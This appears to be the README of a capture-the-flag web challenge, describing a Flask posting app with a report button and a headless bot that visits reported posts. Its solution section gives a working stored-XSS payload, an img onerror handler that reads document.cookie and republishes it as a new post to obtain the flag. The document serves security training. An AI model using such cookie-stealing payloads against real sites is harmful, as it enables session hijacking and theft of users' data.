functionality:
- add a post (no account)
- render posts on index
- render post after clicking of a post
- report button
- bot which goes to rendered post page (triggers xss, cookie)

deploy:
- dependencies: python, flask, selenium, requests
- flask init-db
- flask run (main app)
- flask --app bot run -p 5001

solution:
- new post
- post title: whatever
- post body (most tags are removed by a basic sanitizer):
```html
<img src=x onerror='fetch("/create", { method: "POST", body: new URLSearchParams({ title: "flag", body: "flag: " + document.cookie }) });'>
```
- report the post
- the bot with go to the URL triggering XSS, the headless browser will create a new post with the cookie (contains the flag)

there is a exploit.py file which does this
